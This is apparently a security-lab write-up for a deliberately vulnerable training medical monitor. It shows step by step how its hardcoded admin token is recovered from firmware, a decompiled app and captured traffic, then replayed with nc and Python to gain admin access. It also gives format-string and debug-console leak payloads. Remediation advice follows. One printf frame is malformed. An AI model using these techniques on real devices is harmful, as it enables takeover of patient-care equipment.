---
id: IGP-01
title: "Hardcoded Credential (`OtterMobile2026`)"
category: IoT
status: DONE
severity: Critical
owasp: "IoT I1 — Weak, Guessable, or Hardcoded Passwords"
cwe: "CWE-798 (Hardcoded Credentials)"
source_docs:
  - "CareOtter_Test_Suite.md §IGP-01"
  - "CareOtter.md Vuln #1"
  - "CareOtter_IoT.md §IoT:I1"
affected_components:
  - "labs/careotter/careservice.c"
  - "vulnzoo_apps/careotter_app/app/src/main/java/.../IgpClient.java"
verified_date: "2026-05-02"
---

# IGP-01 — Hardcoded Credential (`OtterMobile2026`)

> **Status:** DONE
> **Source docs:** `CareOtter_Test_Suite.md` §IGP-01, `CareOtter.md` Vuln #1, `CareOtter_IoT.md` §IoT:I1  
> **OWASP:** IoT I1 — Weak, Guessable, or Hardcoded Passwords  
> **CWE:** CWE-798 (Hardcoded Credentials)  
> **Severity:** Critical

---

## Why It Matters

The `careservice` daemon stores the administrator token as a literal string in its source code. When compiled, that string lands in the `.rodata` section of the ELF binary, visible to anyone who inspects the firmware. This turns the credential into a **universal master key**: a single token opens all CareOtter devices in the world, regardless of hospital, patient, or country. Unlike a user password, it cannot be changed from the clinical interface, rotated by IT, or revoked when a technician leaves the company. An attacker who possesses it can read the WiFi configuration, restart services, trigger simulated therapies, or inject shell commands, all without leaving an audit trail.

---

## Root Cause

```c
// labs/careotter/careservice.c
#define ADMIN_TOKEN "OtterMobile2026"
```

The token is compiled into the binary and appears in plaintext in the `.rodata` section. The authentication routine compares the payload of IGP command `0x02` against this compile-time constant using `strncmp()`, with no hashing, no salt, and no per-device derivation.

---

## How an Attacker Obtains It

No sophisticated laboratory is needed. The token leaks through everyday channels:

| Path                            | Tool                                               | Evidence                                                       |
| ------------------------------- | -------------------------------------------------- | -------------------------------------------------------------- |
| **A — Firmware strings**        | `strings /opt/careotter/careservice \| grep Otter` | `OtterMobile2026` in plaintext                                 |
| **B — APK reverse engineering** | `jadx`, `grep ENCODED_TOKEN`                       | XOR-obfuscated token (key `0x5A`) decodes to the same string   |
| **C — Passive network capture** | `tcpdump -i any -w careotter.pcap 'tcp port 9999'` | Token visible in every AUTHENTICATE frame                      |
| **D — Cloud API error oracles** | Trigger verbose error paths (API-03, API-04)       | Raw IGP frames or stack traces leak the magic + opcode mapping |

### Android APK extraction detail

```bash
# 1. Decompile
jadx "$PWD/careotter_app.apk" -d "$PWD/out"

# 2. Find the obfuscation primitive
grep -rnE "ENCODED_TOKEN|decodeToken|0x5A|\^ 0x" out/sources/com/vulnzoo/

# 3. Recover
cd out/sources/com/vulnzoo/
python3 -c '
enc = [0x15,0x2E,0x2E,0x3F,0x28,0x17,0x35,0x38,0x33,0x36,0x3F,0x68,0x6A,0x68,0x6C]
print(bytes(b ^ 0x5A for b in enc).decode())
'
# → OtterMobile2026
```

---

## Path A — Firmware Reverse Engineering (Detailed)

The most direct route when the attacker has, or can obtain, the binary (SD-card extraction, physical access, a leaked OTA, or chained shell from another vulnerability such as BLE-11 or IGP-05):

### 1. Static strings extraction

Most literals jump out immediately from the `.rodata` section:

```bash
strings /opt/careotter/careservice | grep -Ei "otter|auth|magic|care|deauth|wifi"
```

**Expected output (excerpt):**
```
OtterMobile2026
AUTH_SUCCESS
AUTH_FAIL
DEAUTH_OK
GET_NETWORK
DEFIBRILLATED
CARE                 ← the 4 magic bytes appear as ASCII in .rodata
```

### 2. Disassembly confirmation

Use `radare2`, `Ghidra`, or `objdump` to inspect the binary:

```bash
aarch64-linux-gnu-objdump -d /opt/careotter/careservice | less
```

Look for the pattern:
- `read(fd, hdr, 8)` → read the 8-byte IGP header
- `cmp` against `0x43415245` → verify the "CARE" magic
- `switch` over byte at `hdr+4` → command dispatch table

The `switch(cmd)` block makes the command set self-documenting: `0x01..0x0D` map one-to-one onto the cases the attacker will later test. The `ntohs()` call on the length field confirms big-endian.

### 3. Validation against live device

Once the token and header format are recovered from static analysis, validate end-to-end against the live device without using any helper scripts:

```bash
# Send IGP 0x02 AUTHENTICATE using the token recovered above.
# Frame: magic="CARE"(43 41 52 45) cmd=02 status=00 len=000F payload="OtterMobile2026"
printf '\x43\x41\x52\x45\x02\x00\x00\x0fOtterMobile2026' | nc -w 3 192.168.2.1 9999 | xxd
# Expected:
#   00000000: 4155 5448 5f53 5543 4345 5353            AUTH_SUCCESS
```

If you see `AUTH_FAIL` instead, the most common cause is that the APK shipped with a desynchronised `ENCODED_TOKEN` array (the XOR ciphertext does not decode to `"OtterMobile2026"`). Rebuild and reinstall the APK from `vulnzoo_apps/careotter_app/` before retrying:

```bash
cd vulnzoo_apps/careotter_app && ./gradlew assembleDebug
adb uninstall com.vulnzoo.careotter_app
adb install app/build/outputs/apk/debug/app-debug.apk
```

---

## Path B — Android APK Reverse Engineering (Detailed)

The patient application ships the protocol description and the **XOR-obfuscated** admin token in the DEX. Anyone who can install the APK can extract both without ever touching the monitor:

### 1. Obtain the APK

```bash
# Pull from a demo phone
adb shell pm path com.vulnzoo.careotter_app
adb pull /data/app/.../base.apk careotter_app.apk
```

### 2. Decompile

> **IMPORTANT:** On Kali the `jadx` wrapper does `cd /usr/share/jadx/bin` before exec, so a relative path resolves wrong. Always pass an absolute path:

```bash
jadx "$PWD/careotter_app.apk" -d "$PWD/out"
```

### 3. Recover the IGP header layout and opcode table

```bash
grep -rnE "IGP_MAGIC|0x43415245|9999|CMD_" out/sources/com/vulnzoo/
```

**Expected hits:**
```
IgpClient.java: private static final int IGP_MAGIC = 1128354373;  // 0x43415245
IgpClient.java: // [Magic(4)=0x43415245 "CARE"] [Cmd(1)] [Status(1)=0x00] [Len(2)]
IgpClient.java: public static final byte CMD_AUTHENTICATE  = 0x02;
IgpClient.java: public static final byte CMD_DEAUTHENTICATE = 0x0D;
```

> Note: jadx normalises int literals to decimal — `printf '%x\n' 1128354373` → `43415245`

### 4. Find the obfuscation primitive

**The admin token is NOT a plaintext string in the APK.** A naive `strings careotter_app.apk | grep -i otter` returns nothing because the literal `"OtterMobile2026"` only exists at runtime, after `decodeToken()` reverses a single-byte XOR.

```bash
grep -rnE "ENCODED_TOKEN|decodeToken|0x5A|\^ 0x" out/sources/com/vulnzoo/
```

**Expected match (IgpClient.java):**
```java
// VULNERABILITY: admin token XOR-obfuscated with key 0x5A — trivially reversible
private static final byte[] ENCODED_TOKEN = {
    0x15, 0x2E, 0x2E, 0x3F, 0x28, 0x17, 0x35, 0x38,
    0x33, 0x36, 0x3F, 0x68, 0x6A, 0x68, 0x6C
};  // ↳ jadx output: {21, 46, 46, 63, 40, 23, 53, 56, 51, 54, 63, 104, 106, 104, 108}
public static String decodeToken() {
    for (int i = 0; i < ENCODED_TOKEN.length; i++)
        result[i] = (byte) (ENCODED_TOKEN[i] ^ 0x5A);
    ...
}
```

### 5. Recover the cleartext token

**Option 1 — Replay the decoder (key already known):**
```bash
python3 -c '
enc = [0x15,0x2E,0x2E,0x3F,0x28,0x17,0x35,0x38,0x33,0x36,0x3F,0x68,0x6A,0x68,0x6C]
print(bytes(b ^ 0x5A for b in enc).decode())'
# → OtterMobile2026
```

**Option 2 — Single-byte XOR brute force (no need to read decodeToken()):**
```bash
python3 -c '
enc = bytes([0x15,0x2E,0x2E,0x3F,0x28,0x17,0x35,0x38,0x33,0x36,0x3F,0x68,0x6A,0x68,0x6C])
for k in range(256):
    out = bytes(b ^ k for b in enc)
    if all(32 <= c < 127 for c in out): print(f"key=0x{k:02x}: {out.decode()}")'
# → key=0x5a: OtterMobile2026     (the only lexically plausible candidate)
```

**Option 3 — Runtime hook with Frida (no static analysis at all):**
```bash
frida -U -n com.vulnzoo.careotter_app -e '
Java.perform(() => {
  const C = Java.use("com.vulnzoo.careotter_app.IgpClient");
  C.decodeToken.implementation = function () {
    const r = this.decodeToken();
    console.log("TOKEN=" + r);
    return r;
  };
});'
# → TOKEN=OtterMobile2026 the next time the app authenticates
```

### 6. Validation against live device

After this step the attacker has the full IGP header layout, the opcode table, **and** the decoded token — exactly what `igp_helper.py` would have provided, without ever opening it. The obfuscation does not raise the bar: it is a single-byte XOR with the key hardcoded next to the ciphertext, which CWE-656 ("Reliance on Security Through Obscurity") explicitly calls out as ineffective.

```bash
# Send IGP 0x02 AUTHENTICATE using the recovered token.
printf '\x43\x41\x52\x45\x02\x00\x00\x0fOtterMobile2026' | nc -w 3 192.168.2.1 9999 | xxd
# Expected:
#   00000000: 4155 5448 5f53 5543 4345 5353            AUTH_SUCCESS
```

If you see `AUTH_FAIL` instead, the most common cause is that the APK shipped with a desynchronised `ENCODED_TOKEN` array. Rebuild and reinstall the APK before retrying:

```bash
cd vulnzoo_apps/careotter_app && ./gradlew assembleDebug
adb uninstall com.vulnzoo.careotter_app
adb install app/build/outputs/apk/debug/app-debug.apk
```

---

## Path C — Passive Network Capture

The IGP channel is plaintext TCP. An attacker on the same broadcast domain — or after a trivial ARP-spoof on the `192.168.2.0/24` segment — sniffs a single legitimate admin login and infers the entire wire format from one packet.

### 1. Capture traffic

```bash
# On the attacker's host on the lab segment
sudo tcpdump -i any -w careotter.pcap 'tcp port 9999'
```

Wait for (or trigger) any legitimate admin login. If an administrator uses the Android `AdminActivity` or the Cloud API admin panel, the `AUTHENTICATE` frame crosses the wire in plaintext.

### 2. Analyse the capture

```bash
# Open in Wireshark: filter tcp.port == 9999, then Follow → TCP Stream.
# Or extract directly from the pcap with tshark:
tshark -r careotter.pcap -Y 'tcp.port == 9999' -T fields -e tcp.payload
```

**What a login packet looks like in hex:**

```
43 41 52 45  02  00  00 0F   4F 74 74 65 72 4D 6F 62 69 6C 65 32 30 32 36
└─ "CARE" ─┘ cmd  st  len     └────────── "OtterMobile2026" ─────────────┘
```

From this single packet the attacker recovers:

| Field | Value | Inference |
|-------|-------|-----------|
| Magic | `0x43415245` | Big-endian uint32, ASCII "CARE" |
| Cmd | `0x02` | Opcode for AUTHENTICATE |
| Status | `0x00` | Reserved / always zero in requests |
| Len | `0x000F` | Big-endian uint16 = 15 bytes payload |
| Payload | `OtterMobile2026` | The admin token itself |

### 3. Replay without any tools

Because the protocol is unencrypted and stateless (except for the global `authenticated` flag), replay is immediate with any TCP client:

```bash
# Pure shell — no Python, no helper scripts
printf '\x43\x41\x52\x45\x02\x00\x00\x0fOtterMobile2026' | nc 192.168.2.1 9999
# → AUTH_SUCCESS
```

### Why this matters

This is the same path that makes IGP-06 (global authentication state persistence) trivially exploitable across captured sessions. If an attacker captures a single admin session — or even just the first `AUTHENTICATE` frame — they own the device forever (until `careservice` restarts), because the `authenticated=1` flag never expires.

### Negative control

Capture traffic while sending a wrong token to confirm the failure response:

```bash
printf '\x43\x41\x52\x45\x02\x00\x0cWrongToken12' | nc 192.168.2.1 9999
# → AUTH_FAIL
```

Compare the two packets in Wireshark: the only differences are payload length (`0x0C` vs `0x0F`) and payload content (`WrongToken12` vs `OtterMobile2026`). The header structure is identical, confirming the format hypothesis.

---

## Path D — Cloud API Error Oracle (no TCP to :9999)

The Flask Cloud API on `:5002` proxies a subset of IGP commands. Triggering verbose error paths frequently echoes raw IGP frames or `careservice` stack traces into the HTTP response — enough to confirm magic and opcode mapping without ever opening a TCP socket to port 9999.

### 1. Prerequisites

Ensure the Cloud API is reachable and the device IP is configured so the API *attempts* to proxy IGP commands (even if the device itself is unreachable):

```bash
curl -s http://localhost:5002/api/health | python3 -m json.tool
# Verify "device" field is not empty (e.g. "192.168.2.1:9999")
```

### 2. Format-string leak via API-03

The endpoint `/api/device/status` forwards the `module` query parameter directly to the device's `VERIFY_STATUS` handler (IGP 0x05), which uses it as a `snprintf` format string. In `VULNERABLE=1` mode the API does not sanitise the parameter.

```bash
# Trigger a format-string response from the device through the Cloud API
curl -s "http://localhost:5002/api/device/status?module=%25x.%25x.%25x" | python3 -m json.tool
```

**What leaks:**
- The response body contains hexadecimal stack values from `careservice` (e.g. `bffff3a0.8048c23.1`), confirming the device runs a little-endian ARM binary and that the API talks directly to the IGP port.
- Response headers (`Server: Werkzeug/...`) confirm Flask is running in debug-friendly mode.

### 3. Flask debug traceback via API-04

With `VULNERABLE=1`, Flask runs with `debug=True`. Triggering an unhandled exception produces an interactive HTML traceback:

```bash
# Provoke a 404 that renders the Werkzeug debugger page
curl -s http://localhost:5002/api/nonexistent | grep -i "debugger\|traceback"

# Or access the console directly (PIN brute-force is a separate exercise)
curl -s http://localhost:5002/console | head -n 20
```

**What leaks:**
- The traceback shows the exact file paths inside the Docker container (`/app/...`).
- Local variables in the stack frames sometimes include raw IGP responses (`b'AUTH_SUCCESS'`, `b'WIFI_UPDATED'`) or the `Config.DEVICE_IP` value.
- `import os; os.environ` in the console reveals `JWT_SECRET`, `DEVICE_IP`, and other runtime configuration.

### 4. Oversized-parameter error oracle

Send a deliberately malformed request that causes the Cloud API to proxy an invalid IGP frame. The resulting `IGPError` exception propagates back as an HTTP 503 with the raw error text:

```bash
# POST to /api/network/wifi with an SSID longer than 63 bytes (UCI limit)
# This triggers IGP 0x06 with an oversized payload; careservice returns
# ERR_SSID_LEN, which the API echoes in the HTTP body.
curl -s -X POST http://localhost:5002/api/network/wifi \
  -H "Content-Type: application/json" \
  -d '{"ssid":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","password":"12345678"}' \
  | python3 -m json.tool
```

**What leaks:**
- The error message includes the IGP response string (`ERR_SSID_LEN`), confirming the command opcode (`0x06`) and the existence of length validation in `careservice.c`.
- By fuzzing different opcodes via the corresponding REST endpoints, an attacker can map the full IGP command table without touching port 9999.

### 5. Mapping the protocol without port 9999

Combining the three techniques above, the attacker reconstructs the IGP header from HTTP side-channels alone:

| Observation | Source | Inference |
|-------------|--------|-----------|
| `b'AUTH_SUCCESS'` in traceback | Flask debug locals | Token accepted, opcode `0x02` confirmed |
| `0x43415245` in error strings | IGP frame hex dumps | Magic number "CARE" in big-endian |
| `ERR_SSID_LEN` / `ERR_PSK_SHORT` | Malformed WiFi POST | Opcode `0x06` validates SSID/PSK lengths |
| Stack hex values in response | Format-string proxy | `snprintf` misuse confirms `%x` → data leak |

Once the header layout (`[Magic(4)][Cmd(1)][Status(1)][Len(2)]`) and opcode table are inferred, the attacker can open a direct TCP connection to `:9999` and authenticate using the token recovered from any of the four paths (A–D).

---

## Steps to Reproduce

```bash
# Method A: static extraction from binary
strings /opt/careotter/careservice | grep -i otter

# Method B: direct test via IGP (Python helper)
python3 -c '
import socket, struct
s = socket.create_connection(("192.168.2.1", 9999))
p = b"OtterMobile2026"
s.sendall(struct.pack(">IBBH", 0x43415245, 2, 0, len(p)) + p)
print(s.recv(1024))'
# → b"AUTH_SUCCESS"

# Method C: incorrect token (negative control)
python3 -c '
import socket, struct
s = socket.create_connection(("192.168.2.1", 9999))
p = b"WrongToken123"
s.sendall(struct.pack(">IBBH", 0x43415245, 2, 0, len(p)) + p)
print(s.recv(1024))'
# → b"AUTH_FAIL"

# Method D: pure shell (no Python)
printf '\x43\x41\x52\x45\x02\x00\x00\x0fOtterMobile2026' | nc 192.168.2.1 9999
# → AUTH_SUCCESS
```

---

## Chaining Notes

After a single successful `AUTH_SUCCESS` obtained by any path above, **every subsequent TCP connection inherits the privilege** because of the global `authenticated` flag (see IGP-06 in `CareOtter_Test_Suite.md`). From that single login, the attacker can chain — without re-authenticating — into WiFi PSK leak, stack BOF, format-string read, shell injection, therapy log leaks, and alert command injection. The recommended deauthenticate command (`0x0D`) closes the window but is *advisory*: a malicious client will simply never send it.

---

## How It Should Be

A secure design completely eliminates the notion of a "universal factory password." Each monitor should derive its administrative credentials from a **unique hardware-bound secret** — stored in a TPM, Secure Element, or eFuses — combined with its own device identifier (MAC or serial number) via a key derivation function (KDF). The token would never travel over the network in plaintext; instead, the IGP v4 protocol should use **challenge-response** with the hardware secret, so that not even the legitimate administrator knows the underlying key. Sessions should expire after a period of inactivity (for example, fifteen minutes), and each authentication attempt should be logged with timestamp, source IP, and result.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Hardware | TPM / Secure Element / eFuses | Store the derivation secret in a non-exportable manner |
| Firmware | Derive token at runtime with HKDF | Prevent the final credential from appearing in the binary |
| Network | TLS 1.3 with per-device X.509 certificate | Encrypt the management channel and mutually authenticate |
| Authentication | HMAC-SHA256 challenge-response | Eliminate sending of static tokens over the network |
| Active protection | Rate limiting (5 attempts → 5 min lock) | Make brute-force infeasible |
| Auditing | Immutable log of every attempt and command | Detect unauthorized use and enable forensics |

---

## Verification Checklist

- [ ] `strings careservice | grep Otter` returns `OtterMobile2026`
- [ ] Correct token via IGP `0x02` returns `AUTH_SUCCESS`
- [ ] Incorrect token via IGP `0x02` returns `AUTH_FAIL`
- [ ] XOR decode of `ENCODED_TOKEN` in APK yields `OtterMobile2026`
- [ ] `tcpdump` of port 9999 reveals the token in plaintext during AUTHENTICATE

---

## Tasks

### Task 1 


---

## References

- `CareOtter_Test_Suite.md` §IGP-01
- `CareOtter.md` Vuln #1
- `CareOtter_IoT.md` §IoT:I1
